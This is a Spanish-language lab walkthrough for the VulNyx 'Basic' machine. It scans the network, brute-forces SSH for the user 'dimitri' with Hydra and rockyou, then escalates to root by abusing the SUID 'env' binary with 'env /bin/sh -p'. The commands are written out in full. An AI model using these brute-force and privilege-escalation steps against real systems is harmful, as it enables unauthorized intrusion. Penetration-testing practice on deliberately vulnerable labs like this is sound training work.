# Escalada de Privilegios en Linux – Binarios SUID | Parte 2

Maquinas que vamos a utilizar **Kali Linux y Basic** [https://vulnyx.com/#basic](https://vulnyx.com/#basic)

```bash
sudo arp-scan -I eth0 --localnet
```

![image.png](./imagenes/image%2074.png)

```bash
ping -c 1 10.0.3.22
```

![image.png](./imagenes/image%2075.png)

```bash
nmap -p- -sS -sV -sC --open -min-rate=5000 -n -vvv -Pn 10.0.3.22
```

![image.png](./imagenes/image%2076.png)

- Vamos a ver lo que esta corriendo por el **puerto 80**
    
    ![image.png](./imagenes/image%2077.png)
    

- Miramos lo que corre atreves del **puerto 631**
    
    ![image.png](./imagenes/image%2078.png)
    
- Vamos a husmear un poco y nos vamos a la **pestaña Printers** y vemos un posible nombre de usuario **dimitri**.
    
    ![image.png](./imagenes/image%2079.png)
    
- En el **nmap** habíamos visto que estaba **abierto el puerto 22** del **SSH** . Vamos a intentar un **ataque de fuerza bruta** con **Hydra** aprovechando que tenemos un posible nombre de usuario.
    
    ```bash
    hydra -l dimitri -P /usr/share/wordlists/rockyou.txt ssh://10.0.3.22
    ```
    
    ![image.png](./imagenes/image%2080.png)
    
    Nos a sacado un resultado de contraseña: **mememe.**
    
- Nos conectamos vía SSH.
    
    ```bash
    ssh [dimitri@10.0.3.22](./imagenes/mailto:dimitri@10.0.3.22)
    ```
    
    ![image.png](./imagenes/image%2081.png)
    

- Buscamos binarios vulnerables.
    
    `find / -perm -4000 2>/dev/null`
    
    ![image.png](./imagenes/image%2082.png)
    

- Nos vamos a la web [https://gtfobins.github.io/](./imagenes/https://gtfobins.github.io/) y miramos aquellos binarios que no son comunes y podamos pensar que son vulnerable a un ataque SUID. En nuestro caso seria `env`.
    
    ![image.png](./imagenes/image%2083.png)
    
    ![image.png](./imagenes/image%2084.png)
    
    ![image.png](./imagenes/image%2085.png)
    
- Deberíamos probar ambos comandos para ver cual funciona. Pero vamos a probar `./env /bin/sh -p`
    
    Antes de probarlo debemos tener en cuenta que  nosotros no estamos situados dentro de la ruta absoluta **del archivo “env” `/usr/bin/` deberemos quitar el punto que del inicio del comando quedando así `env /bin/sh -p`**
    
    **`env /bin/sh -p`**
    
    ![image.png](./imagenes/image%2086.png)